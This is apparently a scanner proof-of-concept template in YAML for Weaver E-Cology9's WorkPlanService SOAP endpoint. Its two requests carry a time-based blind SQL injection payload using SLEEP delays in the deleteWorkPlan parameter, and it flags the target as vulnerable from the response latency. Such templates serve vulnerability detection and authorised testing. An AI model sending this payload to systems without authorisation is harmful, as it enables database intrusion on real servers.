name: poc-yaml-Weaver-E-Cology9-WorkPlanService-sql
transport: http


rules:
  r0:
    request:
      method: POST
      path: /services/WorkPlanService
      headers:
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
        Content-Type: text/xml;charset=UTF-8
      body: 
       "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"webservices.workplan.weaver.com.cn\">
          <soapenv:Header/>
            <soapenv:Body>
            <web:deleteWorkPlan>
              <!--type: string-->
              <web:in0>(SELECT 8544 FROM (SELECT(SLEEP(6-(IF(27=27,0,5)))))NZeo)</web:in0>
              <!--type: int-->
              <web:in1>22</web:in1>
            </web:deleteWorkPlan>
            </soapenv:Body>
        </soapenv:Envelope>"
    expression: response.status == 200 && response.latency >= 6000 && response.latency <= 7000
  r1:
    request:
      method: POST
      path: /services/WorkPlanService
      headers:
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
        Content-Type: text/xml;charset=UTF-8
      body: 
       "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"webservices.workplan.weaver.com.cn\">
          <soapenv:Header/>
            <soapenv:Body>
            <web:deleteWorkPlan>
              <!--type: string-->
              <web:in0>(SELECT 8544 FROM (SELECT(SLEEP(10-(IF(27=27,0,5)))))NZeo)</web:in0>
              <!--type: int-->
              <web:in1>22</web:in1>
            </web:deleteWorkPlan>
            </soapenv:Body>
        </soapenv:Envelope>"
    expression: response.status == 200 && response.latency >= 10000 && response.latency <= 11000

expression: r0() && r1() 

